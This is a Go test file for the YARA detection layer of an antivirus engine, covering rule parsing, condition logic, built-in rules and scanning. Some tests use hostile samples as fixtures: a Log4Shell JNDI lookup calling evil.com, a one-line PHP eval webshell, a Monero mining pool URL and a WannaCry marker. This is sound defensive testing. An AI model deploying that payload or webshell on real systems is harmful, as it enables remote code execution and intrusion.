package yara

import (
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"axiomnizam.bitbd.net/axiomnizam/internal/antivirus"
)

// ─────────────────────────────────────────────────────────────────────────────
// Parser Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestParseRule_Basic(t *testing.T) {
	src := `rule Test_Rule : tag1 tag2 {
	meta:
		description = "Test rule"
		author = "tester"
	strings:
		$s1 = "malware_string"
		$s2 = { 4D 5A 90 00 }
	condition:
		any of them
}`
	rule, err := ParseRule(src)
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	if rule.Name != "Test_Rule" {
		t.Errorf("wrong name: %q", rule.Name)
	}
	if len(rule.Tags) != 2 || rule.Tags[0] != "tag1" {
		t.Errorf("wrong tags: %v", rule.Tags)
	}
	if rule.Meta["description"] != "Test rule" {
		t.Errorf("wrong meta: %v", rule.Meta)
	}
	if len(rule.Strings) != 2 {
		t.Fatalf("expected 2 strings, got %d", len(rule.Strings))
	}
	if rule.Strings[0].ID != "$s1" || string(rule.Strings[0].Value) != "malware_string" {
		t.Errorf("wrong string 0: %+v", rule.Strings[0])
	}
	if rule.Strings[1].ID != "$s2" || !rule.Strings[1].IsHex || len(rule.Strings[1].Value) != 4 {
		t.Errorf("wrong string 1: %+v", rule.Strings[1])
	}
	if rule.Condition != "any of them" {
		t.Errorf("wrong condition: %q", rule.Condition)
	}
}

func TestParseRule_NoTags(t *testing.T) {
	src := `rule Simple {
	strings:
		$a = "test"
	condition:
		$a
}`
	rule, err := ParseRule(src)
	if err != nil {
		t.Fatal(err)
	}
	if rule.Name != "Simple" {
		t.Errorf("wrong name: %q", rule.Name)
	}
	if len(rule.Tags) != 0 {
		t.Errorf("expected no tags, got %v", rule.Tags)
	}
}

func TestParseRule_Nocase(t *testing.T) {
	src := `rule NocaseTest {
	strings:
		$s1 = "CaSe" nocase
	condition:
		$s1
}`
	rule, err := ParseRule(src)
	if err != nil {
		t.Fatal(err)
	}
	if !rule.Strings[0].Nocase {
		t.Error("expected nocase=true")
	}
}

func TestParseRule_NoName(t *testing.T) {
	_, err := ParseRule(`{ condition: true }`)
	if err == nil {
		t.Error("expected error for rule without name")
	}
}

func TestParseRules_Multiple(t *testing.T) {
	src := `rule A {
	strings:
		$s1 = "aaa"
	condition:
		$s1
}

rule B {
	strings:
		$s1 = "bbb"
	condition:
		$s1
}`
	rules, err := ParseRules(src)
	if err != nil {
		t.Fatal(err)
	}
	if len(rules) != 2 {
		t.Fatalf("expected 2 rules, got %d", len(rules))
	}
	if rules[0].Name != "A" || rules[1].Name != "B" {
		t.Errorf("wrong names: %q, %q", rules[0].Name, rules[1].Name)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Condition Evaluation Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestCondition_AnyOfThem(t *testing.T) {
	rs := NewRuleSet()
	rs.AddRule(Rule{
		Name:      "AnyTest",
		Strings:   []RuleString{{ID: "$s1", Value: []byte("find_me")}},
		Condition: "any of them",
	})
	matches := rs.Match([]byte("xxxx find_me yyyy"))
	if len(matches) != 1 {
		t.Fatalf("expected 1 match, got %d", len(matches))
	}
}

func TestCondition_AllOfThem(t *testing.T) {
	rs := NewRuleSet()
	rs.AddRule(Rule{
		Name: "AllTest",
		Strings: []RuleString{
			{ID: "$s1", Value: []byte("aaa")},
			{ID: "$s2", Value: []byte("bbb")},
		},
		Condition: "all of them",
	})

	// Both present.
	if len(rs.Match([]byte("aaa bbb"))) != 1 {
		t.Error("expected match when both present")
	}
	// Only one present.
	if len(rs.Match([]byte("aaa ccc"))) != 0 {
		t.Error("should not match when only one present")
	}
}

func TestCondition_NOfThem(t *testing.T) {
	rs := NewRuleSet()
	rs.AddRule(Rule{
		Name: "NTest",
		Strings: []RuleString{
			{ID: "$s1", Value: []byte("aaa")},
			{ID: "$s2", Value: []byte("bbb")},
			{ID: "$s3", Value: []byte("ccc")},
		},
		Condition: "2 of them",
	})
	if len(rs.Match([]byte("aaa bbb"))) != 1 {
		t.Error("expected match with 2 of 3")
	}
	if len(rs.Match([]byte("aaa xxx"))) != 0 {
		t.Error("should not match with 1 of 3")
	}
}

func TestCondition_And(t *testing.T) {
	rs := NewRuleSet()
	rs.AddRule(Rule{
		Name: "AndTest",
		Strings: []RuleString{
			{ID: "$s1", Value: []byte("alpha")},
			{ID: "$s2", Value: []byte("beta")},
		},
		Condition: "$s1 and $s2",
	})
	if len(rs.Match([]byte("alpha beta"))) != 1 {
		t.Error("expected match with both")
	}
	if len(rs.Match([]byte("alpha only"))) != 0 {
		t.Error("should not match with only one")
	}
}

func TestCondition_Or(t *testing.T) {
	rs := NewRuleSet()
	rs.AddRule(Rule{
		Name: "OrTest",
		Strings: []RuleString{
			{ID: "$s1", Value: []byte("alpha")},
			{ID: "$s2", Value: []byte("beta")},
		},
		Condition: "$s1 or $s2",
	})
	if len(rs.Match([]byte("alpha only"))) != 1 {
		t.Error("expected match with one")
	}
	if len(rs.Match([]byte("neither"))) != 0 {
		t.Error("should not match with none")
	}
}

func TestCondition_SingleVar(t *testing.T) {
	rs := NewRuleSet()
	rs.AddRule(Rule{
		Name:      "VarTest",
		Strings:   []RuleString{{ID: "$s1", Value: []byte("target")}},
		Condition: "$s1",
	})
	if len(rs.Match([]byte("target found"))) != 1 {
		t.Error("expected match")
	}
}

func TestCondition_NOfPrefix(t *testing.T) {
	rs := NewRuleSet()
	rs.AddRule(Rule{
		Name: "PrefixTest",
		Strings: []RuleString{
			{ID: "$web1", Value: []byte("eval(")},
			{ID: "$web2", Value: []byte("system(")},
			{ID: "$other", Value: []byte("safe")},
		},
		Condition: "2 of ($web*)",
	})
	if len(rs.Match([]byte("eval( system( safe"))) != 1 {
		t.Error("expected match with 2 of $web*")
	}
	if len(rs.Match([]byte("eval( safe"))) != 0 {
		t.Error("should not match with only 1 of $web*")
	}
}

func TestCondition_NoMatch(t *testing.T) {
	rs := NewRuleSet()
	rs.AddRule(Rule{
		Name:      "NoMatch",
		Strings:   []RuleString{{ID: "$s1", Value: []byte("impossible")}},
		Condition: "$s1",
	})
	if len(rs.Match([]byte("nothing here"))) != 0 {
		t.Error("should not match")
	}
}

func TestCondition_Nocase(t *testing.T) {
	rs := NewRuleSet()
	rs.AddRule(Rule{
		Name:      "NocaseMatch",
		Strings:   []RuleString{{ID: "$s1", Value: []byte("MaLwArE"), Nocase: true}},
		Condition: "$s1",
	})
	if len(rs.Match([]byte("this has malware in it"))) != 1 {
		t.Error("nocase should match case-insensitively")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Built-in Rules Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestBuiltinRules_Register(t *testing.T) {
	rs := NewRuleSet()
	count := RegisterBuiltinRules(rs)
	if count == 0 {
		t.Fatal("no builtin rules registered")
	}
	if count != BuiltinRuleCount() {
		t.Errorf("expected %d, got %d", BuiltinRuleCount(), count)
	}
	t.Logf("registered %d builtin YARA rules", count)
}

func TestBuiltinRules_WannaCry(t *testing.T) {
	rs := NewRuleSet()
	RegisterBuiltinRules(rs)
	matches := rs.Match([]byte("found WannaCrypt marker and WNcry@2ol7 password"))
	found := false
	for _, m := range matches {
		if strings.Contains(m.Rule.Name, "WannaCry") {
			found = true
			break
		}
	}
	if !found {
		t.Error("WannaCry rule should match")
	}
}

func TestBuiltinRules_Log4Shell(t *testing.T) {
	rs := NewRuleSet()
	RegisterBuiltinRules(rs)
	matches := rs.Match([]byte(`{"input": "${jndi:ldap://evil.com/exploit}"}`))
	found := false
	for _, m := range matches {
		if strings.Contains(m.Rule.Name, "Log4Shell") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Log4Shell rule should match")
	}
}

func TestBuiltinRules_PHPWebshell(t *testing.T) {
	rs := NewRuleSet()
	RegisterBuiltinRules(rs)
	matches := rs.Match([]byte(`<?php eval($_POST["cmd"]); ?>`))
	found := false
	for _, m := range matches {
		if strings.Contains(m.Rule.Name, "Webshell") {
			found = true
			break
		}
	}
	if !found {
		t.Error("PHP webshell rule should match")
	}
}

func TestBuiltinRules_CleanFile(t *testing.T) {
	rs := NewRuleSet()
	RegisterBuiltinRules(rs)
	matches := rs.Match([]byte("This is a perfectly clean and normal text file."))
	if len(matches) != 0 {
		t.Errorf("clean file should not match, got %d", len(matches))
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Layer Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestLayer_Name(t *testing.T) {
	l := NewLayer(nil)
	if l.Name() != "yara" {
		t.Errorf("expected 'yara', got %q", l.Name())
	}
}

func TestLayer_Scan_Detection(t *testing.T) {
	rs := NewRuleSet()
	RegisterBuiltinRules(rs)
	l := NewLayer(rs)

	threats, err := l.Scan(&antivirus.ScanTarget{
		Content:  []byte("this has stratum+tcp://pool.minexmr.com:4444 inside"),
		Filename: "miner.txt",
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(threats) == 0 {
		t.Error("expected miner detection")
	}
	for _, th := range threats {
		if th.Layer != antivirus.LayerYARA {
			t.Errorf("wrong layer: %s", th.Layer)
		}
	}
}

func TestLayer_Scan_Clean(t *testing.T) {
	rs := NewRuleSet()
	RegisterBuiltinRules(rs)
	l := NewLayer(rs)

	threats, err := l.Scan(&antivirus.ScanTarget{
		Content:  []byte("nothing suspicious"),
		Filename: "clean.txt",
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(threats) != 0 {
		t.Errorf("expected no threats, got %d", len(threats))
	}
}

func TestLayer_Scan_Empty(t *testing.T) {
	l := NewLayer(nil)
	threats, err := l.Scan(&antivirus.ScanTarget{Content: nil})
	if err != nil {
		t.Fatal(err)
	}
	if len(threats) != 0 {
		t.Errorf("expected 0, got %d", len(threats))
	}
}

func TestLayer_Reload(t *testing.T) {
	l := NewLayer(nil)

	rs := NewRuleSet()
	rs.AddRule(Rule{
		Name:      "Reloaded",
		Strings:   []RuleString{{ID: "$s1", Value: []byte("reload_test")}},
		Condition: "$s1",
	})
	l.Reload(rs)

	threats, _ := l.Scan(&antivirus.ScanTarget{
		Content: []byte("reload_test"), Filename: "test",
	})
	if len(threats) != 1 {
		t.Errorf("expected 1 threat after reload, got %d", len(threats))
	}
}

func TestLayer_ConcurrentScans(t *testing.T) {
	rs := NewRuleSet()
	RegisterBuiltinRules(rs)
	l := NewLayer(rs)

	var wg sync.WaitGroup
	for i := 0; i < 30; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			l.Scan(&antivirus.ScanTarget{
				Content: []byte("safe data"), Filename: "test",
			})
		}()
	}
	wg.Wait()
	if l.Stats().TotalScans != 30 {
		t.Errorf("expected 30 scans, got %d", l.Stats().TotalScans)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// File Loading Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestLoadFromDir(t *testing.T) {
	dir := t.TempDir()
	content := `rule TestFile {
	strings:
		$s1 = "file_pattern"
	condition:
		$s1
}`
	os.WriteFile(filepath.Join(dir, "test.yar"), []byte(content), 0644)

	rs := NewRuleSet()
	loaded, errs := LoadFromDir(rs, dir)
	if len(errs) > 0 {
		t.Errorf("errors: %v", errs)
	}
	if loaded != 1 {
		t.Errorf("expected 1 loaded, got %d", loaded)
	}
}

func TestLoadFromDir_NonExistent(t *testing.T) {
	rs := NewRuleSet()
	loaded, errs := LoadFromDir(rs, "/nonexistent/dir")
	if len(errs) != 0 || loaded != 0 {
		t.Errorf("non-existent dir should return 0, nil")
	}
}

func TestLayer_Stats(t *testing.T) {
	rs := NewRuleSet()
	RegisterBuiltinRules(rs)
	l := NewLayer(rs)
	stats := l.Stats()
	if stats.RuleCount == 0 {
		t.Error("expected rules in stats")
	}
	t.Logf("stats: %+v", stats)
}
